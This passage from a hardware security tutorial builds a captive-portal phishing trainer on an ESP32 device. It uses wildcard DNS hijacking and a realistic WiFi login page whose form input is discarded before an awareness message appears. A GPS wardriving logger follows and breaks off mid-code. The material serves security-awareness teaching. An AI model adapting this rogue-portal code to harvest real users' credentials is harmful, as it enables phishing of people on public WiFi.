When a device connects to a WiFi network, the operating system automatically probes specific URLs to detect whether a captive portal is present:

```
┌─────────────────────────────────────────────────────────┐
│           Captive Portal Detection Probes                │
├────────────┬────────────────────────────────────────────┤
│ Platform   │ Probe URL                                  │
├────────────┼────────────────────────────────────────────┤
│ Apple iOS  │ http://captive.apple.com/hotspot-detect.html│
│ Apple macOS│ http://captive.apple.com/hotspot-detect.html│
│ Android    │ http://connectivitycheck.gstatic.com/      │
│            │   generate_204                              │
│ Windows 10+│ http://www.msftconnecttest.com/connecttest  │
│ Windows    │ http://www.msftncsi.com/ncsi.txt            │
│ Firefox    │ http://detectportal.firefox.com/success.txt │
│ Chrome     │ http://clients3.google.com/generate_204     │
└────────────┴────────────────────────────────────────────┘

Normal network: probe URL returns expected response
                → Device assumes internet is available

Captive portal: probe URL returns redirect or unexpected response
                → Device shows captive portal login page
```

Our DNS server will resolve ALL domain names to the T-Embed's IP address. When the device's captive portal probe is redirected, it automatically opens the login page.

**Step 2 --- Set Up the Project**

```cpp
// ============================================================
// Evil Portal Credential Awareness Trainer
// WiFi captive portal for security awareness training
// DOES NOT capture credentials - shows educational message
// ============================================================

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <SPIFFS.h>

// --- Pin Definitions ---
#define ENCODER_A      4
#define ENCODER_B      5
#define ENCODER_BTN    6
#define BUZZER_PIN     46

// --- WiFi AP Configuration ---
// Change these for your training scenario
const char* AP_SSID     = "Free_Public_WiFi";
const char* AP_PASSWORD  = "";  // Open network (no password)
const int   AP_CHANNEL   = 6;
const int   AP_MAX_CONN  = 8;

// --- DNS Server ---
const byte DNS_PORT = 53;
DNSServer dnsServer;

// --- Web Server ---
WebServer webServer(80);

// --- Display ---
TFT_eSPI tft = TFT_eSPI();
#define SCREEN_W 320
#define SCREEN_H 170

// --- Statistics ---
struct PortalStats {
    int totalConnections;
    int uniqueDevices;
    int portalViews;
    int formSubmissions;    // Attempted logins
    int awarenessShown;     // Users who saw the message
    unsigned long startTime;
};
PortalStats stats = {0, 0, 0, 0, 0, 0};

// --- Device Tracking (by MAC) ---
#define MAX_TRACKED_DEVICES 50
struct TrackedDevice {
    uint8_t mac[6];
    unsigned long firstSeen;
    unsigned long lastSeen;
    int connectionCount;
    bool sawAwareness;
};
TrackedDevice devices[MAX_TRACKED_DEVICES];
int deviceCount = 0;

// --- Event Timeline ---
#define MAX_EVENTS 30
struct PortalEvent {
    unsigned long timestamp;
    char type[12];      // "CONNECT", "PORTAL", "SUBMIT", "AWARE"
    char macStr[18];
};
PortalEvent events[MAX_EVENTS];
int eventHead = 0;
int eventCount = 0;

void logPortalEvent(const char* type, const char* mac) {
    PortalEvent* e = &events[eventHead];
    e->timestamp = (millis() - stats.startTime) / 1000;
    strncpy(e->type, type, sizeof(e->type) - 1);
    strncpy(e->macStr, mac, sizeof(e->macStr) - 1);
    eventHead = (eventHead + 1) % MAX_EVENTS;
    if (eventCount < MAX_EVENTS) eventCount++;
}
```

**Step 3 --- Create the Captive Portal HTML Pages**

The portal has two pages: a convincing login page and the awareness message. The login page is designed to look legitimate (as a real attacker would build it) but the form handler immediately shows the educational message instead of capturing data:

```cpp
// --- Login Page HTML ---
const char LOGIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,
          initial-scale=1.0">
    <title>WiFi Login Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont,
                'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg,
                #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo svg {
            width: 48px; height: 48px;
            fill: #667eea;
        }
        h1 {
            text-align: center;
            color: #1a1a2e;
            font-size: 22px;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 32px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.2s;
            outline: none;
        }
        input:focus {
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg,
                #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2
                    C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3
                    c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2
                    c2.76-2.76 7.24-2.76 10 0l2-2
                    C15.14 9.14 8.87 9.14 5 13z"/>
            </svg>
        </div>
        <h1>Connect to WiFi</h1>
        <p class="subtitle">Sign in to access the internet</p>
        <form action="/submit" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email"
                    placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password"
                    placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn">
                Connect to Internet
            </button>
        </form>
        <p class="footer">
            By connecting, you agree to our Terms of Service
        </p>
    </div>
</body>
</html>
)rawliteral";

// --- Awareness Message HTML ---
const char AWARENESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,
          initial-scale=1.0">
    <title>Security Awareness</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont,
                'Segoe UI', Roboto, sans-serif;
            background: #1a1a2e;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
        }
        .alert-box {
            background: linear-gradient(135deg,
                #ff6b6b, #ee5a24);
            border-radius: 16px;
            padding: 32px;
            margin-bottom: 24px;
            text-align: center;
        }
        .alert-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }
        .alert-box h1 {
            font-size: 24px;
            margin-bottom: 12px;
        }
        .alert-box p {
            font-size: 15px;
            opacity: 0.9;
            line-height: 1.5;
        }
        .info-box {
            background: #16213e;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 16px;
            border-left: 4px solid #667eea;
        }
        .info-box h2 {
            font-size: 16px;
            color: #667eea;
            margin-bottom: 12px;
        }
        .info-box ul {
            padding-left: 20px;
        }
        .info-box li {
            margin-bottom: 8px;
            font-size: 14px;
            line-height: 1.5;
            color: #b0b0b0;
        }
        .reassurance {
            background: #0d7377;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert-box">
            <div class="alert-icon">&#9888;</div>
            <h1>You Just Got Phished</h1>
            <p>You entered credentials into a network
               you do not control. In a real attack, your
               email and password would now be in the
               hands of an attacker.</p>
        </div>
        <div class="info-box">
            <h2>What happened?</h2>
            <ul>
                <li>You connected to an open WiFi network
                    that you do not own or trust</li>
                <li>A captive portal asked for your login
                    credentials</li>
                <li>You submitted information without
                    verifying the network was legitimate</li>
                <li>This is called an <strong>Evil Twin</strong>
                    attack and it is extremely common</li>
            </ul>
        </div>
        <div class="info-box">
            <h2>How to protect yourself</h2>
            <ul>
                <li><strong>Never enter credentials</strong>
                    on open WiFi captive portals</li>
                <li><strong>Use a VPN</strong> on public
                    WiFi networks</li>
                <li><strong>Verify the network</strong>
                    with staff before connecting</li>
                <li><strong>Use cellular data</strong>
                    instead of untrusted WiFi</li>
                <li><strong>Enable 2FA</strong> on all
                    accounts so stolen passwords alone
                    are not enough</li>
                <li><strong>Look for HTTPS</strong> and
                    valid certificates before entering
                    passwords</li>
            </ul>
        </div>
        <div class="reassurance">
            <strong>Relax:</strong> This was a security
            awareness exercise. Your credentials were
            NOT captured or stored. This device
            immediately discarded everything you typed.
            But a real attacker would not be so kind.
        </div>
    </div>
</body>
</html>
)rawliteral";
```

**Step 4 --- Implement the DNS and Web Server**

The DNS server redirects ALL domain lookups to the T-Embed's IP. The web server handles captive portal detection probes and serves the login/awareness pages:

```cpp
void setupWebServer() {
    // Captive portal detection endpoints
    // Apple
    webServer.on("/hotspot-detect.html",
                 HTTP_GET, handlePortalDetect);
    webServer.on("/library/test/success.html",
                 HTTP_GET, handlePortalDetect);
    // Android
    webServer.on("/generate_204",
                 HTTP_GET, handlePortalDetect);
    webServer.on("/gen_204",
                 HTTP_GET, handlePortalDetect);
    // Windows
    webServer.on("/connecttest.txt",
                 HTTP_GET, handlePortalDetect);
    webServer.on("/ncsi.txt",
                 HTTP_GET, handlePortalDetect);
    // Firefox
    webServer.on("/success.txt",
                 HTTP_GET, handlePortalDetect);

    // Main login page
    webServer.on("/", HTTP_GET, handleLoginPage);

    // Form submission (AWARENESS - does NOT capture creds)
    webServer.on("/submit", HTTP_POST, handleFormSubmit);

    // Catch-all: redirect everything to portal
    webServer.onNotFound(handlePortalDetect);

    webServer.begin();
}

void handlePortalDetect() {
    stats.portalViews++;
    logPortalEvent("PORTAL",
        webServer.client().remoteIP().toString().c_str());
    webServer.sendHeader("Location",
        "http://192.168.4.1/", true);
    webServer.send(302, "text/html", "Redirecting...");
    updateDisplay();
}

void handleLoginPage() {
    stats.portalViews++;
    webServer.send(200, "text/html", LOGIN_HTML);
    updateDisplay();
}

void handleFormSubmit() {
    // CRITICAL: We deliberately DO NOT read or store
    // the submitted email/password values.
    // The form data is discarded immediately.

    stats.formSubmissions++;
    stats.awarenessShown++;
    logPortalEvent("AWARE",
        webServer.client().remoteIP().toString().c_str());

    // Serve the awareness education page
    webServer.send(200, "text/html", AWARENESS_HTML);

    // Audible notification on T-Embed
    ledcWriteTone(0, 880);
    delay(100);
    ledcWriteTone(0, 1100);
    delay(100);
    ledcWriteTone(0, 0);

    updateDisplay();
    Serial.println("Awareness message shown to user");
}
```

{: .note }
> Notice that `handleFormSubmit()` never calls `webServer.arg("email")` or `webServer.arg("password")`. The form data exists in the HTTP POST body but is never read, parsed, or stored. This is the key design decision that makes this a training tool rather than an attack tool.

**Step 5 --- Track Connected Devices**

Monitor WiFi station connections to count unique devices:

```cpp
void checkNewConnections() {
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterList;

    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterList);

    for (int i = 0; i < adapterList.num; i++) {
        tcpip_adapter_sta_info_t station = adapterList.sta[i];
        uint8_t* mac = station.mac;

        // Check if we have seen this MAC before
        bool found = false;
        for (int d = 0; d < deviceCount; d++) {
            if (memcmp(devices[d].mac, mac, 6) == 0) {
                devices[d].lastSeen = millis();
                devices[d].connectionCount++;
                found = true;
                break;
            }
        }

        if (!found && deviceCount < MAX_TRACKED_DEVICES) {
            TrackedDevice* dev = &devices[deviceCount];
            memcpy(dev->mac, mac, 6);
            dev->firstSeen = millis();
            dev->lastSeen = millis();
            dev->connectionCount = 1;
            dev->sawAwareness = false;
            deviceCount++;

            stats.uniqueDevices++;
            stats.totalConnections++;

            char macStr[18];
            snprintf(macStr, sizeof(macStr),
                "%02X:%02X:%02X:%02X:%02X:%02X",
                mac[0], mac[1], mac[2],
                mac[3], mac[4], mac[5]);
            logPortalEvent("CONNECT", macStr);

            // Beep on new connection
            ledcWriteTone(0, 660);
            delay(80);
            ledcWriteTone(0, 0);

            updateDisplay();
        }
    }
}
```

**Step 6 --- Build the TFT Dashboard**

The display shows a real-time overview of the training session:

```cpp
void updateDisplay() {
    tft.fillScreen(TFT_BLACK);

    // --- Header ---
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("EVIL PORTAL", 80, 2);
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("AWARENESS TRAINER", 105, 22);

    tft.drawFastHLine(0, 33, SCREEN_W, TFT_DARKGREY);

    // --- SSID and Uptime ---
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("SSID: " + String(AP_SSID), 5, 37);
    unsigned long uptime = (millis() - stats.startTime) / 1000;
    char uptimeStr[16];
    snprintf(uptimeStr, sizeof(uptimeStr), "%02lu:%02lu:%02lu",
        uptime / 3600, (uptime % 3600) / 60, uptime % 60);
    tft.drawString("Up: " + String(uptimeStr), 230, 37);

    // --- Statistics Grid ---
    int gridY = 50;
    tft.drawFastHLine(0, gridY, SCREEN_W, TFT_DARKGREY);
    gridY += 4;

    // Row 1: Connections and Unique Devices
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString(String(stats.totalConnections), 30, gridY);
    tft.drawString(String(stats.uniqueDevices), 190, gridY);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Connections", 10, gridY + 20);
    tft.drawString("Unique Devices", 160, gridY + 20);

    gridY += 34;

    // Row 2: Portal Views and Awareness Shown
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString(String(stats.portalViews), 30, gridY);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(String(stats.awarenessShown), 190, gridY);
    tft.setTextSize(1);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Portal Views", 10, gridY + 20);
    tft.drawString("Trained", 175, gridY + 20);

    gridY += 32;
    tft.drawFastHLine(0, gridY, SCREEN_W, TFT_DARKGREY);
    gridY += 4;

    // --- Recent Events ---
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("RECENT ACTIVITY", 110, gridY);
    gridY += 12;

    for (int i = 0; i < min(eventCount, 3); i++) {
        int idx = (eventHead - 1 - i + MAX_EVENTS)
                  % MAX_EVENTS;
        PortalEvent* e = &events[idx];

        uint16_t color = TFT_WHITE;
        if (strcmp(e->type, "CONNECT") == 0) color = TFT_CYAN;
        else if (strcmp(e->type, "PORTAL") == 0) color = TFT_YELLOW;
        else if (strcmp(e->type, "AWARE") == 0) color = TFT_GREEN;

        tft.setTextColor(color, TFT_BLACK);
        char line[50];
        snprintf(line, sizeof(line), "%lus %-8s %s",
            e->timestamp, e->type, e->macStr);
        tft.drawString(line, 5, gridY);
        gridY += 10;
        if (gridY > SCREEN_H - 5) break;
    }
}
```

The display layout:

```
┌──────────────────────────────────────────┐
│         EVIL PORTAL                      │
│        AWARENESS TRAINER                 │
│──────────────────────────────────────────│
│ SSID: Free_Public_WiFi    Up: 00:12:34  │
│──────────────────────────────────────────│
│    7                   4                 │
│  Connections       Unique Devices        │
│                                          │
│   12                   3                 │
│  Portal Views        Trained             │
│──────────────────────────────────────────│
│            RECENT ACTIVITY               │
│ 342s AWARE    192.168.4.3               │
│ 298s PORTAL   192.168.4.3               │
│ 201s CONNECT  AA:BB:CC:DD:EE:FF         │
└──────────────────────────────────────────┘
```

**Step 7 --- Wire Up the Main Program**

```cpp
void setup() {
    Serial.begin(115200);
    pinMode(ENCODER_BTN, INPUT_PULLUP);
    pinMode(ENCODER_A, INPUT_PULLUP);
    pinMode(ENCODER_B, INPUT_PULLUP);

    // Audio setup
    ledcSetup(0, 1000, 8);
    ledcAttachPin(BUZZER_PIN, 0);
    ledcWriteTone(0, 0);

    // Display setup
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);

    // Initialize SPIFFS (for optional custom HTML templates)
    SPIFFS.begin(true);

    // --- Start WiFi Access Point ---
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(
        IPAddress(192, 168, 4, 1),   // AP IP
        IPAddress(192, 168, 4, 1),   // Gateway
        IPAddress(255, 255, 255, 0)  // Subnet
    );
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL,
                0, AP_MAX_CONN);

    Serial.print("AP started: ");
    Serial.println(AP_SSID);
    Serial.print("IP: ");
    Serial.println(WiFi.softAPIP());

    // --- Start DNS Server (all domains -> our IP) ---
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    // --- Start Web Server ---
    setupWebServer();

    // --- Initialize Stats ---
    stats.startTime = millis();

    // --- Startup sound ---
    ledcWriteTone(0, 440);
    delay(100);
    ledcWriteTone(0, 660);
    delay(100);
    ledcWriteTone(0, 880);
    delay(150);
    ledcWriteTone(0, 0);

    updateDisplay();
    Serial.println("Evil Portal Awareness Trainer active");
}

void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();

    // Check for new WiFi connections every second
    static unsigned long lastCheck = 0;
    if (millis() - lastCheck > 1000) {
        checkNewConnections();
        lastCheck = millis();
    }

    // Encoder press: cycle SSID presets or stop
    if (digitalRead(ENCODER_BTN) == LOW) {
        delay(200);
        // Long press (>1s) to stop
        unsigned long pressStart = millis();
        while (digitalRead(ENCODER_BTN) == LOW) {
            if (millis() - pressStart > 1000) {
                // Shutdown
                WiFi.softAPdisconnect(true);
                tft.fillScreen(TFT_BLACK);
                tft.setTextColor(TFT_WHITE, TFT_BLACK);
                tft.setTextSize(2);
                tft.drawString("STOPPED", 110, 60);
                tft.setTextSize(1);
                tft.drawString(
                    String(stats.awarenessShown) +
                    " users trained", 100, 90);
                while (true) delay(1000);
            }
        }
    }

    // Update display every 5 seconds
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 5000) {
        updateDisplay();
        lastDisplayUpdate = millis();
    }
}
```

**Step 8 --- Test the Portal**

1. Upload the sketch to your T-Embed
2. On your phone, open WiFi settings and look for "Free_Public_WiFi"
3. Connect to it (no password required)
4. Your phone should automatically detect the captive portal and show the login page
5. Enter any dummy text (it will not be saved) and press "Connect to Internet"
6. The awareness message appears explaining what just happened
7. The T-Embed TFT shows the connection and awareness events in real time
8. The buzzer sounds on each new connection and each awareness display

{: .tip }
> If the captive portal page does not appear automatically, open a web browser and navigate to any HTTP (not HTTPS) website, such as `http://example.com`. The DNS redirect will intercept it and show the login page. Some modern browsers with HSTS may only accept HTTPS, which the captive portal cannot intercept --- this is actually a security feature working as intended.

**Step 9 --- Understand Real Evil Twin Attack Anatomy**

With your training tool running, take a moment to understand what a real attacker does differently:

```
Training Tool (this project):        Real Attack:
────────────────────────────────────────────────────────
Open AP with obvious name            Clones exact SSID of nearby
                                     legitimate network

Shows login page                     Shows identical clone of the
                                     real network's login page

Discards all form input              Captures and stores every
                                     credential entered

Shows awareness message              Redirects to real internet
                                     (victim never knows)

Logs only MAC + timestamp            Logs credentials, cookies,
                                     session tokens, browsing

Runs with consent                    Runs covertly

Educational                          Criminal
```

Defenses users should adopt:
1. **Use a VPN** on any public WiFi --- encrypts all traffic
2. **Verify the network** with staff at the location
3. **Prefer cellular data** over open WiFi
4. **Never enter credentials** on captive portal login pages
5. **Enable two-factor authentication** on all accounts
6. **Check for HTTPS** and valid certificates before submitting anything

### Expected Results

- The T-Embed creates an open WiFi access point visible to all nearby devices
- Phones and laptops that connect will automatically see the captive portal login page
- The login page looks convincing and professional (a realistic phishing scenario)
- When users submit the form, they immediately see the security awareness message
- No credentials are captured, stored, or transmitted --- form input is discarded
- The TFT dashboard shows real-time statistics: connections, portal views, and users trained
- Most users are genuinely surprised when the awareness message appears
- The tool typically "catches" 60--80% of people who connect (the rest disconnect before submitting)

### Extensions

- Add multiple portal templates: social media login, email login, bank login (all showing the same awareness message)
- Implement a QR code on the TFT display that links to a longer security awareness resource page
- Add the ability to clone a specific SSID by scanning for nearby networks and selecting one to imitate (only on your own network)
- Build a post-training report generator that exports session statistics to a JSON file on SPIFFS
- Add a "safe mode" toggle that skips the login page entirely and goes straight to the awareness message (for live demonstrations)
- Create a timer-based auto-shutdown that stops the portal after a configurable training window (e.g., 30 minutes) to prevent accidental extended operation

---

## Project 21: Wardriving Data Logger with GPS
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Wardriving is the practice of surveying wireless networks by physically moving through an area while logging every access point your device detects. It is one of the oldest and most fundamental wireless reconnaissance techniques, dating back to the early 2000s when security researchers would drive around cities with laptops and external WiFi antennas to map the state of wireless security. The name itself is a nod to "wardialing" from the 1983 film WarGames.

In this project, you will wire a NEO-6M GPS module to the T-Embed CC1101 Plus, combine WiFi scanning with real-time GPS coordinates, and log every discovered network to an SD card in WiGLE-compatible CSV format. As you drive or walk through your neighborhood, the T-Embed will continuously scan for WiFi networks and stamp each one with precise latitude, longitude, altitude, and speed data. The result is a complete geospatial map of every wireless network in your area.

This is a purely passive activity. Your device only listens to beacon frames that access points are already broadcasting publicly. You never connect to, interact with, or interfere with any network. Wardriving has been practiced openly by security researchers for over two decades and is generally considered legal in most jurisdictions because it involves only the passive reception of publicly broadcast radio signals. However, laws vary by location --- always check your local regulations before starting. See the legality discussion at the end of this project.

### What You'll Learn

- Wiring and communicating with a UART GPS module (NEO-6M)
- Parsing NMEA GPS sentences with the TinyGPS++ library
- Combining WiFi scanning with GPS coordinate stamping
- SD card logging in structured CSV format
- WiGLE.net data format and community wardriving databases
- Real-time dashboard design on the TFT display
- Power management for extended mobile scanning sessions
- Geospatial data collection methodology

### Materials Needed

- T-Embed CC1101 Plus with antenna
- NEO-6M GPS module with ceramic patch antenna (widely available, approximately $8--12)
- MicroSD card module (SPI interface) and a microSD card (any size --- even 1 GB will hold millions of records)
- Jumper wires (female-to-female, at least 6)
- External battery pack (1000+ mAh LiPo via JST connector) for portable operation
- (Optional) USB OTG adapter for powering the GPS from the T-Embed's USB port
- (Optional) Suction cup mount for vehicle windshield
- Computer with Arduino IDE or PlatformIO

### Step-by-Step Instructions

**Step 1 --- Wire the NEO-6M GPS Module**

The NEO-6M communicates over UART (serial) at 9600 baud by default. The T-Embed has available UART pins on GPIO 17 (TX) and GPIO 18 (RX) that are not used by any onboard peripheral.

{: .warning }
> The NEO-6M module operates at 3.3V logic levels, which is compatible with the ESP32-S3 GPIO pins directly. Some NEO-6M breakout boards have an onboard 3.3V regulator and accept 5V power input --- check your specific board. **Never connect 5V to an ESP32-S3 GPIO pin.**

Wiring diagram:

```
T-Embed CC1101 Plus              NEO-6M GPS Module
+--------------------------+     +--------------------------+
|                          |     |                          |
|  3V3 --------------------+-----+--> VCC                   |
|                          |     |                          |
|  GND --------------------+-----+--> GND                   |
|                          |     |                          |
|  GPIO 18 (RX) <----------+-----+--- TX                    |
|                          |     |                          |
|  GPIO 17 (TX) -----------+-----+--> RX                    |
|                          |     |                          |
+--------------------------+     +--------------------------+

Note: TX connects to RX and RX connects to TX (cross-connected, as with all UART)
```

Physical connection steps:

1. Power off the T-Embed completely
2. Connect T-Embed **3V3** to NEO-6M **VCC** (red wire)
3. Connect T-Embed **GND** to NEO-6M **GND** (black wire)
4. Connect T-Embed **GPIO 18** to NEO-6M **TX** (yellow wire)
5. Connect T-Embed **GPIO 17** to NEO-6M **RX** (green wire)
6. Ensure the GPS ceramic antenna has a clear view of the sky (face it upward)
7. Power on and verify the GPS module's LED blinks (indicating it is searching for satellites)

{: .tip }
> The NEO-6M takes 30--90 seconds to acquire a GPS fix on cold start (first power-on or after being off for hours). Subsequent fixes after a warm start take 1--5 seconds. Start the device outdoors with a clear sky view for the fastest initial fix.

**Step 2 --- Wire the MicroSD Card Module**

The SD card module communicates over SPI. Use the following available GPIO pins:

```
T-Embed CC1101 Plus              MicroSD Module
+--------------------------+     +--------------------------+
|                          |     |                          |
|  3V3 --------------------+-----+--> VCC (3.3V)            |
|                          |     |                          |
|  GND --------------------+-----+--> GND                   |
|                          |     |                          |
|  GPIO 5  (SCK) ----------+-----+--> SCK                   |
|                          |     |                          |
|  GPIO 6  (MOSI) ---------+-----+--> MOSI                  |
|                          |     |                          |
|  GPIO 7  (MISO) ---------+-----+--> MISO                  |
|                          |     |                          |
|  GPIO 10 (CS) -----------+-----+--> CS                    |
|                          |     |                          |
+--------------------------+     +--------------------------+
```

{: .note }
> This uses a separate SPI bus from the CC1101 and TFT display, avoiding any bus conflicts. The ESP32-S3 supports multiple SPI bus instances.

**Step 3 --- Install Required Libraries**

In Arduino IDE, install the following libraries via the Library Manager:

- **TinyGPS++** by Mikal Hart --- GPS NMEA sentence parsing
- **SD** --- built-in Arduino library for SD card access
- **WiFi** --- built-in ESP32 library
- **TFT_eSPI** --- display driver, likely already configured for your T-Embed

**Step 4 --- Write the Wardriving Firmware**

Create a new sketch and enter the following complete firmware:

```cpp
/*
 * T-Embed CC1101 Plus -- Wardriving Data Logger with GPS
 *
 * Combines WiFi scanning with GPS coordinates.
 * Logs all discovered networks to SD card in WiGLE CSV.
 * Displays live dashboard on TFT.
 *
 * Wiring:
 *   GPS TX  -> GPIO 18 (UART RX)
 *   GPS RX  -> GPIO 17 (UART TX)
 *   SD SCK  -> GPIO 5
 *   SD MOSI -> GPIO 6
 *   SD MISO -> GPIO 7
 *   SD CS   -> GPIO 10
 */

#include <WiFi.h>
#include <TinyGPSPlus.h>
#include <SPI.h>
#include <SD.h>
#include <TFT_eSPI.h>

// --- Pin Definitions ---
#define GPS_RX_PIN    18
#define GPS_TX_PIN    17
#define GPS_BAUD      9600

#define SD_SCK        5
#define SD_MOSI       6
#define SD_MISO       7
#define SD_CS         10

// --- Objects ---
TinyGPSPlus gps;
HardwareSerial gpsSerial(1);
TFT_eSPI tft = TFT_eSPI();
SPIClass sdSPI(HSPI);

// --- State ---
uint32_t totalNetworks = 0;
uint32_t totalUnique   = 0;
uint32_t scanCount     = 0;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 3000;

#define MAX_UNIQUE 4096
String knownBSSIDs[MAX_UNIQUE];
uint16_t knownCount = 0;

File logFile;
String logFileName;
bool sdReady  = false;
bool gpsFixed = false;

const char* WIGLE_HEADER =
    "WigleWifi-1.4,appRelease=1.0,model=T-Embed-CC1101,"
    "release=1.0,device=ESP32-S3,display=TFT,"
    "board=LILYGO,brand=LILYGO\n"
    "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,"
    "CurrentLatitude,CurrentLongitude,"
    "AltitudeMeters,AccuracyMeters,Type";

// --- Forward declarations ---
void performWiFiScan();
void logNetwork(String bssid, String ssid,
                wifi_auth_mode_t auth,
                int32_t ch, int32_t rssi);
void createLogFile();
void updateDashboard();
String authModeStr(wifi_auth_mode_t m);

void setup() {
    Serial.begin(115200);

    // Initialize TFT
    tft.init();
    tft.setRotation(1);  // Landscape 320x170
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("T-EMBED WARDRIVER", 160, 40, 4);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("WiFi + GPS Logger", 160, 70, 2);
    tft.setTextDatum(TL_DATUM);
    delay(2000);

    // Initialize GPS UART
    gpsSerial.begin(GPS_BAUD, SERIAL_8N1,
                    GPS_RX_PIN, GPS_TX_PIN);

    // Initialize SD card on separate SPI bus
    sdSPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
    if (SD.begin(SD_CS, sdSPI)) {
        sdReady = true;
        createLogFile();
    } else {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawString("SD CARD FAILED", 10, 100, 2);
        delay(2000);
    }

    // WiFi station mode for scanning (no connection)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
}

void loop() {
    // Feed GPS parser with all available data
    while (gpsSerial.available() > 0) {
        gps.encode(gpsSerial.read());
    }

    gpsFixed = gps.location.isValid()
               && gps.location.isUpdated();

    // Run WiFi scan at interval
    if (millis() - lastScanTime >= SCAN_INTERVAL) {
        lastScanTime = millis();
        performWiFiScan();
        scanCount++;
    }

    updateDashboard();
}

void performWiFiScan() {
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) return;
    totalNetworks += n;

    for (int i = 0; i < n; i++) {
        String bssid = WiFi.BSSIDstr(i);
        bool isNew = true;
        for (uint16_t j = 0; j < knownCount; j++) {
            if (knownBSSIDs[j] == bssid) {
                isNew = false;
                break;
            }
        }
        if (isNew && knownCount < MAX_UNIQUE) {
            knownBSSIDs[knownCount++] = bssid;
            totalUnique++;
        }
        if (sdReady && gpsFixed) {
            logNetwork(bssid, WiFi.SSID(i),
                       WiFi.encryptionType(i),
                       WiFi.channel(i),
                       WiFi.RSSI(i));
        }
    }
    WiFi.scanDelete();
}

String authModeStr(wifi_auth_mode_t m) {
    switch (m) {
        case WIFI_AUTH_OPEN:            return "[OPEN]";
        case WIFI_AUTH_WEP:             return "[WEP]";
        case WIFI_AUTH_WPA_PSK:         return "[WPA-PSK]";
        case WIFI_AUTH_WPA2_PSK:        return "[WPA2-PSK]";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "[WPA/WPA2]";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-EAP]";
        case WIFI_AUTH_WPA3_PSK:        return "[WPA3-PSK]";
        default:                        return "[UNKNOWN]";
    }
}

void logNetwork(String bssid, String ssid,
                wifi_auth_mode_t auth,
